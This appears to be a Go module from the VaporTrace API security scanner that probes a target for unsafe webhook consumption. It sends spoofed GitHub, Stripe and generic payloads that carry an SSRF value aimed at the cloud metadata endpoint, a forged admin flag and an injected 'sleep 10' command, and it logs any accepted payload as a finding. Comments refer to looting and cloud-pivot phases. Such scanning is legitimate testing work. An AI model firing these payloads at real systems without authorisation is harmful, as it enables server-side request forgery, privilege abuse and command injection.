package logic

import (
	"bytes"
	"fmt"
	"net/http"
	"time"

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db" // Added Persistence
	"github.com/pterm/pterm"
)

type IntegrationContext struct {
	TargetURL       string
	IntegrationType string // e.g., "github", "stripe", "generic"
}

func (i *IntegrationContext) Probe() {
	pterm.DefaultHeader.WithFullWidth(false).Println("API10: Unsafe Consumption / Integration Probe")

	// Payload list: Simulating common third-party webhook structures
	payloads := map[string]string{
		"GitHub-Spoof":      `{"repository": {"url": "http://169.254.169.254/latest/meta-data/"}, "sender": {"login": "vapor-trace"}}`,
		"Stripe-Spoof":      `{"id": "evt_test", "type": "customer.subscription.deleted", "data": {"object": {"metadata": {"internal_admin": "true"}}}}`,
		"Generic-Injection": `{"source": "third-party", "data": {"cmd": "sleep 10"}}`,
	}

	pterm.Info.Printf("Testing [%s] consumption logic...\n\n", i.IntegrationType)

	for name, body := range payloads {
		req, _ := http.NewRequest("POST", i.TargetURL, bytes.NewBuffer([]byte(body)))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Vapor-Trace-Tactical", "API10-Probe")
		
		// Some APIs require specific User-Agents to process integrations
		req.Header.Set("User-Agent", fmt.Sprintf("VaporTrace-%s-Scanner", i.IntegrationType))

		start := time.Now()
		
		// PATCH: Implementación del Gatekeeper SafeDo (Reemplaza GlobalClient.Do)
		// Esto garantiza la activación de Phase 8.1 (Looting) y Phase 8.2 (Cloud Pivot)
		resp, err := SafeDo(req, false, "API10-PROBE")
		duration := time.Since(start)

		if err != nil {
			pterm.Error.Printf("Probe failed for %s: %v\n", name, err)
			continue
		}
		// REGLA DE ORO: SafeDo ya gestionó la lectura; cerramos el body persistido.
		defer resp.Body.Close()

		pterm.Info.Printf("Payload: %-18s | Status: %d | Latency: %v\n", name, resp.StatusCode, duration)

		// Analysis: If the server accepts these payloads (200/201/202), 
		// it suggests a lack of signature verification (HMAC).
		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
			pterm.Warning.Prefix = pterm.Prefix{Text: "VULN", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
			pterm.Warning.Printf("Potential Unsafe Consumption: Server accepted %s without signature.\n", name)

			// PERSISTENCE HOOK
			db.LogQueue <- db.Finding{
				Phase:   "PHASE IV: INJECTION",
				Target:  i.TargetURL,
				Details: fmt.Sprintf("Unsafe Integration [%s]: Accepted unsigned %s payload", i.IntegrationType, name),
				Status:  "VULNERABLE",
			}
		}
	}
}